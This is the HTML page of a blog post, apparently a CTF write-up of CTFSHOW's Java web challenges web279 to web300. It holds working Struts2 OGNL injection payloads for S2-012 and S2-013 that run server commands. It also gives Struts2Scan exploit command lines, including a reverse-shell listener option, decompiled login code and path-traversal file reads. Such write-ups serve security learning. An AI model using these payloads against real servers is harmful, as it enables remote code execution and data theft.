@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="web279-web283脚本一键利用 https:&#x2F;&#x2F;github.com&#x2F;wyzmgmdg&#x2F;Struts2Scan   web284Struts-S2-012漏洞利用，参考文章构造 payload。%&amp;#123;#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&amp;#123;&quot;env&quot;&amp;#125;)).redirec">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Practice - CTFSHOW WEB入门 JAVA篇">
+<meta property="og:url" content="https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-java/index.html">
+<meta property="og:site_name" content="Recharging Runtime">
+<meta property="og:description" content="web279-web283脚本一键利用 https:&#x2F;&#x2F;github.com&#x2F;wyzmgmdg&#x2F;Struts2Scan   web284Struts-S2-012漏洞利用，参考文章构造 payload。%&amp;#123;#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&amp;#123;&quot;env&quot;&amp;#125;)).redirec">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-06-03T23:56:16.000Z">
+<meta property="article:modified_time" content="2022-06-18T14:55:32.362Z">
+<meta property="article:author" content="b_y">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Practice">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Practice - CTFSHOW WEB入门 JAVA篇</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Recharging Runtime" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/06/07/ctfshow-web-getting-started-xss/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/06/03/ctfshow-web-getting-started-php-cve/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-java/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-java/&text=Practice - CTFSHOW WEB入门 JAVA篇"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-java/&title=Practice - CTFSHOW WEB入门 JAVA篇"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-java/&is_video=false&description=Practice - CTFSHOW WEB入门 JAVA篇"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Practice - CTFSHOW WEB入门 JAVA篇&body=Check out this article: https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-java/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-java/&title=Practice - CTFSHOW WEB入门 JAVA篇"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-java/&title=Practice - CTFSHOW WEB入门 JAVA篇"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-java/&title=Practice - CTFSHOW WEB入门 JAVA篇"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-java/&title=Practice - CTFSHOW WEB入门 JAVA篇"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-java/&name=Practice - CTFSHOW WEB入门 JAVA篇&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-java/&t=Practice - CTFSHOW WEB入门 JAVA篇"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web279-web283"><span class="toc-number">1.</span> <span class="toc-text">web279-web283</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web284"><span class="toc-number">2.</span> <span class="toc-text">web284</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web285"><span class="toc-number">3.</span> <span class="toc-text">web285</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web286-web288"><span class="toc-number">4.</span> <span class="toc-text">web286-web288</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web289"><span class="toc-number">5.</span> <span class="toc-text">web289</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web290"><span class="toc-number">6.</span> <span class="toc-text">web290</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web291"><span class="toc-number">7.</span> <span class="toc-text">web291</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web292"><span class="toc-number">8.</span> <span class="toc-text">web292</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web293"><span class="toc-number">9.</span> <span class="toc-text">web293</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web294"><span class="toc-number">10.</span> <span class="toc-text">web294</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web295"><span class="toc-number">11.</span> <span class="toc-text">web295</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web296"><span class="toc-number">12.</span> <span class="toc-text">web296</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web297"><span class="toc-number">13.</span> <span class="toc-text">web297</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web298"><span class="toc-number">14.</span> <span class="toc-text">web298</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web299"><span class="toc-number">15.</span> <span class="toc-text">web299</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web300"><span class="toc-number">16.</span> <span class="toc-text">web300</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Practice - CTFSHOW WEB入门 JAVA篇
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">b_y</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-06-03T23:56:16.000Z" itemprop="datePublished">2022-06-04</time>
+        
+        (Updated: <time datetime="2022-06-18T14:55:32.362Z" itemprop="dateModified">2022-06-18</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link-link" href="/tags/Practice/" rel="tag">Practice</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="web279-web283"><a href="#web279-web283" class="headerlink" title="web279-web283"></a>web279-web283</h2><p>脚本一键利用 <a target="_blank" rel="noopener" href="https://github.com/wyzmgmdg/Struts2Scan">https://github.com/wyzmgmdg/Struts2Scan</a>  </p>
+<h2 id="web284"><a href="#web284" class="headerlink" title="web284"></a>web284</h2><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/cde51192616e">Struts-S2-012漏洞利用</a>，参考文章构造 <code>payload</code>。<br><code>%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</code></p>
+<h2 id="web285"><a href="#web285" class="headerlink" title="web285"></a>web285</h2><p>参考文章<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/d6c361e9db31">Struts-S2-013漏洞利用</a>构造 <code>payload</code>，或利用工具 <a target="_blank" rel="noopener" href="https://github.com/HatBoy/Struts2-Scan">Struts2-Scan</a> 一键利用。<br>payload: <code>/S2-013/link.action?url=%24%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(&#39;env&#39;).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%23d)%2C%23out.close())%7D</code>  </p>
+<h2 id="web286-web288"><a href="#web286-web288" class="headerlink" title="web286-web288"></a>web286-web288</h2><p>脚本，–exec 显示不完整就弹 shell。  </p>
+<h2 id="web289"><a href="#web289" class="headerlink" title="web289"></a>web289</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python .\Struts2Scan.py -u http://6cc667dc-21e1-47f6-bc20-7c86de46d293.challenge.ctf.show/S2-029/default.action?message=aaaaa -n S2-032 --<span class="built_in">exec</span></span><br><span class="line">&gt;&gt; <span class="built_in">env</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="web290"><a href="#web290" class="headerlink" title="web290"></a>web290</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python .\Struts2Scan.py -u http://472b9395-a127-4f0b-9dbc-c9d19bf93912.challenge.ctf.show/S2-032/memoshow.action?<span class="built_in">id</span>=3 -n S2-045 --<span class="built_in">exec</span></span><br><span class="line">&gt;&gt; <span class="built_in">env</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="web291"><a href="#web291" class="headerlink" title="web291"></a>web291</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python .\Struts2Scan.py -u http://b7828e36-6040-474a-8d74-5b2e47e9d225.challenge.ctf.show/S2-033/orders -n S2-045 --<span class="built_in">exec</span></span><br><span class="line">&gt;&gt; <span class="built_in">env</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="web292"><a href="#web292" class="headerlink" title="web292"></a>web292</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python .\Struts2Scan.py -u http://36034b6f-491f-4b59-8281-ede2349302ff.challenge.ctf.show/S2-037/orders -n S2-045 --<span class="built_in">exec</span></span><br><span class="line">&gt;&gt; <span class="built_in">env</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="web293"><a href="#web293" class="headerlink" title="web293"></a>web293</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python .\Struts2Scan.py -u http://474f4f6b-8ae7-42c0-bb45-9e1cf63bd17a.challenge.ctf.show/S2-045/orders -n S2-045 --<span class="built_in">exec</span></span><br><span class="line">&gt;&gt; <span class="built_in">env</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="web294"><a href="#web294" class="headerlink" title="web294"></a>web294</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python .\Struts2Scan.py -u http://79931272-f07a-41a3-8608-ec19106644c3.challenge.ctf.show/S2-046/doUpload.action -n S2-046 --<span class="built_in">exec</span></span><br><span class="line">&gt;&gt; <span class="built_in">env</span></span><br></pre></td></tr></table></figure>
+<p>提示不存在可忽略</p>
+<h2 id="web295"><a href="#web295" class="headerlink" title="web295"></a>web295</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python .\Struts2Scan.py -u http://d8a2ded0-0c5d-4a17-846a-5ae627dd1468.challenge.ctf.show/S2-048/integration/saveGangster.action -d <span class="string">&quot;name=&#123;exp&#125;&amp;age=11111&amp;description=aaaa&quot;</span> -n S2-048 -lr x.x.x.x:9999</span><br></pre></td></tr></table></figure>
+
+<h2 id="web296"><a href="#web296" class="headerlink" title="web296"></a>web296</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python .\Struts2Scan.py -u http://770a3f17-692b-4558-aebe-838df182ff9c.challenge.ctf.show/S2-052/orders -n S2-045 --<span class="built_in">exec</span></span><br><span class="line">&gt;&gt; <span class="built_in">env</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="web297"><a href="#web297" class="headerlink" title="web297"></a>web297</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python .\Struts2Scan.py -u http://7545e434-5ce5-4cd7-8d62-2da3276d6cf3.challenge.ctf.show/S2-053/?name=VulApps -n S2-045 --<span class="built_in">exec</span></span><br><span class="line">&gt;&gt; <span class="built_in">env</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="web298"><a href="#web298" class="headerlink" title="web298"></a>web298</h2><p>jadx 反编译给的 war 包里面的 class。  </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctfshow.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ctfshow.model.User;</span><br><span class="line"><span class="keyword">import</span> com.ctfshow.util.Util;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">loginServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">3044593499093610703L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        loginServlet.<span class="built_in">super</span>.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(username, request.getParameter(<span class="string">&quot;password&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span> (username == <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">            out.print(<span class="string">&quot;you are not admin&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (user.getVipStatus()) &#123;</span><br><span class="line">            out.print(<span class="string">&quot;you are login&quot;</span>);</span><br><span class="line">            out.print(Util.readFlag(<span class="string">&quot;/flag&quot;</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            out.print(<span class="string">&quot;login failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>user model</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctfshow.model;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">4069265999830231626L</span>;</span><br><span class="line">    <span class="keyword">private</span> Boolean isVip;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username2)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPassword</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPassword</span><span class="params">(String password2)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.password = password2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Boolean <span class="title function_">getIvVip</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.isVip;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setIvVip</span><span class="params">(Boolean ivVip)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.isVip = ivVip;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String username2, String password2)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username2;</span><br><span class="line">        <span class="built_in">this</span>.password = password2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">getVipStatus</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.username.equals(<span class="string">&quot;admin&quot;</span>) || !<span class="built_in">this</span>.password.equals(<span class="string">&quot;ctfshow&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User [username=&quot;</span> + <span class="built_in">this</span>.username + <span class="string">&quot;, password=&quot;</span> + <span class="built_in">this</span>.password + <span class="string">&quot;, isVip=&quot;</span> + <span class="built_in">this</span>.isVip + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>根据源码构造 payload: <code>/ctfshow/login?username=admin&amp;password=ctfshow</code></p>
+<h2 id="web299"><a href="#web299" class="headerlink" title="web299"></a>web299</h2><p>html 注释 <code>/view-source?file=index.php</code>，读取 WEB-INF/web.xml 有 com.ctfshow.servlet.GetFlag，读 WEB-INF/classes/com/ctfshow/servlet/GetFlag.class 内有 flag 路径 /fl3g，读 ../../../../../../fl3g 得 flag。<br>尝试过读 class 下载进行反编译，无果。<br>payload: /view-source?file=../../../../../../fl3g</p>
+<h2 id="web300"><a href="#web300" class="headerlink" title="web300"></a>web300</h2><p>同上题。<br>payload: /?file=../../../../../f1bg</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web279-web283"><span class="toc-number">1.</span> <span class="toc-text">web279-web283</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web284"><span class="toc-number">2.</span> <span class="toc-text">web284</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web285"><span class="toc-number">3.</span> <span class="toc-text">web285</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web286-web288"><span class="toc-number">4.</span> <span class="toc-text">web286-web288</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web289"><span class="toc-number">5.</span> <span class="toc-text">web289</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web290"><span class="toc-number">6.</span> <span class="toc-text">web290</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web291"><span class="toc-number">7.</span> <span class="toc-text">web291</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web292"><span class="toc-number">8.</span> <span class="toc-text">web292</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web293"><span class="toc-number">9.</span> <span class="toc-text">web293</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web294"><span class="toc-number">10.</span> <span class="toc-text">web294</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web295"><span class="toc-number">11.</span> <span class="toc-text">web295</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web296"><span class="toc-number">12.</span> <span class="toc-text">web296</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web297"><span class="toc-number">13.</span> <span class="toc-text">web297</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web298"><span class="toc-number">14.</span> <span class="toc-text">web298</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web299"><span class="toc-number">15.</span> <span class="toc-text">web299</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web300"><span class="toc-number">16.</span> <span class="toc-text">web300</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-java/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-java/&text=Practice - CTFSHOW WEB入门 JAVA篇"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-java/&title=Practice - CTFSHOW WEB入门 JAVA篇"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-java/&is_video=false&description=Practice - CTFSHOW WEB入门 JAVA篇"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Practice - CTFSHOW WEB入门 JAVA篇&body=Check out this article: https://blog.477.moe/2022/06/03/ctfshow-web-getting-started-java/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
